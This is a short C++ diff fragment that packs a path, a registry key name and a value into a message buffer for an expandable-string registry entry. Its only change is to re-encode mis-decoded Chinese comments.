+			memcpy(tmp,FullPath.GetBuffer(0),msg.count);        //é¡¹  
 		tmp+=msg.count;
-		memcpy(tmp,dlg.m_path.GetBuffer(0),msg.size);          //¼üÃû
+		memcpy(tmp,dlg.m_path.GetBuffer(0),msg.size);          //é”®å
 		tmp+=msg.size;
-		memcpy(tmp,dlg.m_key.GetBuffer(0),msg.valsize);          //Öµ
+		memcpy(tmp,dlg.m_key.GetBuffer(0),msg.valsize);          //å€¼
 		tmp=buf+3+sizeof(msg);
 		
-		// ÉÆºó
+		// å–„å
 		type=MREG_EXPAND_SZ;
 		how=4;
 		Key=dlg.m_path;
